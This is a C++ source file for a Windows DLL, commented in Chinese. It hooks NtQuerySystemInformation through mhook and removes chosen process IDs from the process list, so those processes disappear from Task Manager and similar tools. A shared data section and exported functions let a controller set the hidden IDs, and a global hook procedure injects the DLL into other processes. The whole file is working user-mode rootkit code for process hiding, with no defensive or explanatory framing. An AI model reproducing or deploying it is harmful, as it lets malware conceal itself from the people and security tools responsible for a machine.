#include "stdafx.h"
#include "mhook/mhook-lib/mhook.h"
#include <tchar.h>
#include <string>
#include <Psapi.h>

#define MAX_PROC_NUM		32			// 最多隐藏进程数
using namespace std;

#pragma data_seg("shared")
HHOOK	 hHook = NULL;
DWORD	 g_tHideProcInfo[MAX_PROC_NUM] = { 0 }; // 当前隐藏进程的信息
#pragma data_seg()

#pragma comment (lib,"Psapi.lib")
#pragma comment(linker,"/section:shared,RWS")

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

typedef struct _MY_SYSTEM_PROCESS_INFORMATION 
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID SystemInformation,
    __in       ULONG SystemInformationLength,
    __out_opt  PULONG ReturnLength
    );


PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = 
    (PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
    )
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext    = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
        
        do {
            pCurrent = pNext;
            pNext    = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
			
			for (DWORD i = 0; (i < MAX_PROC_NUM) && g_tHideProcInfo[i]; i++) {
				if (pNext->ProcessId == (HANDLE)g_tHideProcInfo[i]) {
					if (0 == pNext->NextEntryOffset) {
						pCurrent->NextEntryOffset = 0;
					} else {
						pCurrent->NextEntryOffset += pNext->NextEntryOffset;
					}

					pNext = pCurrent;
					break;
				}
			}
        } while (pCurrent->NextEntryOffset != 0);
    }

    return status;
}

extern "C" BOOL  __stdcall UpdateHideProcTbl(DWORD dwProcNum, DWORD dwProcId)
{
	if (dwProcNum >= MAX_PROC_NUM) {
		return FALSE;
	}

	g_tHideProcInfo[dwProcNum] = dwProcId;

	return TRUE;
}

extern "C" BOOL  __stdcall GetProcTbl(DWORD index, DWORD* dwProcId)
{
	BOOL bRet = FALSE;
	*dwProcId = 0;
	if (index < MAX_PROC_NUM) {
		*dwProcId = g_tHideProcInfo[index];
		bRet = TRUE;
	}
	
	return bRet;
}

extern "C" BOOL __stdcall SetHook(HHOOK hook)  
{  
   hHook = hook;

   return TRUE;
}  

extern "C" LRESULT CALLBACK HookProc(int nCode,WPARAM wParam,LPARAM lParam)  
{  
    return CallNextHookEx(hHook, nCode, wParam, lParam);  
}  

BOOL WINAPI DllMain(
    __in HINSTANCE  hInstance,
    __in DWORD      Reason,
    __in LPVOID     Reserved
    )
{
    switch (Reason)
    {
    case DLL_PROCESS_ATTACH:
        Mhook_SetHook((PVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
        break;

    case DLL_PROCESS_DETACH:
        Mhook_Unhook((PVOID*)&OriginalNtQuerySystemInformation);
        break;
    }

    return TRUE;
}
